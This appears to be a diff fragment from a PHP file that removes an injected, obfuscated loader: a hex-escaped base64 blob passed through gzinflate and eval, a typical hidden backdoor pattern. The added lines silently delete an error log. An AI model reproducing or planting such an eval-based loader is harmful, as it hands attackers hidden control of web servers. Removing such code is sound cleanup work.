-$An0n_3xPloiTeR = "\x3d\x3d\x41\x41SM5gpu\x41\x42NiU\x42E4fU97q2/7\x2bmJXhevZyE46nSto9L0lje\x2b9\x62vQh1WtjO663ff\x2bxtFrWudf\x63mSUTOFKgw0z\x414uqW\x6167h2s0U\x41kXZe\x62NsVPkrufyxe53KeJxXI1YMf\x41IWEeMSg7dhIR\x422\x61Df95ZzG0HyKiREMq\x43DGv\x41vnIUG3N/d6KWmxWDQp4eV\x2b\x62OQdwhfry\x41TghSH\x41\x63OR\x41ns5d\x61\x61Vm\x42i8\x432/4pEH/5V\x61m\x2bg3e4EiMm8u385YNhTLeHWDO97\x616Spz\x62w/qz605I4\x2b5P\x423MnWFOJSHJE3\x622w\x43/kONJGgTxEdmjS0nIPjHq6Q\x43uvr6\x62MjugoeZiVRJZupPNkyKfjE7VyLjO1k/jYJgMwskYJNK\x630fUVf7L7zR1KN8iDz237eV2e\x41U\x42\x61v\x41\x42oUQFkrJSV4\x62eiDp\x41e7zLZTPtUeIdRho/O\x62X1XPNky\x2bDYoLUD9VGSN05e\x2bpo2\x6260VgMem\x413y/pD\x61pp3Zw\x62dmy0J6I/6NDlxSV\x42/\x42vQY\x62v\x61D7V\x62fd\x2beQr3vTk\x432kjj49gYp\x423QJdT03Yjv\x630gTxJ\x6326WOUQv0TigWrT0UdFmMgn71XjVIFQsVs\x43/yIdNXOpt1nK/38WHmmLmgf/7s\x2boxVyRVPRXkl3Q649f\x62eJGW\x61mf77q\x43J4osWf7jN\x62ZMxve\x2bufY/2kFHS\x43kh\x61lTN1FzM1nI1867kUVzrFDjrR\x2bVSfSx6pNRp/ZKHmxH\x43\x42TQr0xwsHVpi3VN7SkXW8NuYxdFoOZ\x2be3gQQ/1hKrj6JdhW881HtW4yst1\x437FLF2tH4VwH\x41F7IY0EZgTkXrkSizGVH9RJuRlSJW8legZV\x62Lr\x623\x43USL00P7H8\x2b7Lf4j\x61E3hLv1\x61/jZgkP\x61R/g6QXM01799v5deDW\x2bg7\x42TvsrrF\x62/7LsFWRiYS\x439LyH/yOyhQ5rpGyYyN\x62ui8/lGNR58nnE\x620ue0DtlS\x41WddM1ELnIvGYSf1/ks\x42OKUW\x62Nk09rRZ\x63iqm8/p\x2bj0oNQp\x42\x63E8ZJYo\x61h5EY0\x63m3K4kIITGfZ\x41sIwMf\x42figG\x620mIIo9joy9Vu\x412\x2bivPHT8NVY\x614hE1VEDlw0QIqv\x41HH\x2bf2zTxqJHjV\x41WxosOJD\x2b8\x636OedRQlK\x42HETNY\x61W/0Y\x63rdmhidRrDLwZmfOMwix3wHlO7D\x63\x42N\x42VqiRmxpsIxzsW\x434nm6O8\x62eEWfXEIY\x2bue\x63\x61u9n\x616Q\x61Wez\x42P\x627v\x2b9qM5k\x6192exWv9\x62wH544HD2E3hr7vx\x63UmNIqH/Ik\x63i4Oe1q/\x61e\x41lole13PiR1/Z\x61e9\x61\x61\x2b8Q\x628zdHrxdpRoVzW0rW1v\x62nGrfeewjfv/zuInYIzn\x612kJ3SlQid9\x2b\x2b\x427FyXpdVky16YiqVDNqEQiSQUNZx1W9i\x42JvXIRejYdZhgfsiWKst\x41TH43\x41e9PHDhN\x627W4WWK/QMw7\x42wJe8Xw\x416H\x41/\x41Mw/\x42wJe7XP\x42KEw\x2bwTwD\x42wJe7XO\x42\x61Ew\x2bgTwH\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($UeXploiT))));
-exit;
+        endforeach;
+@unlink('error_log');
+}
 ?>
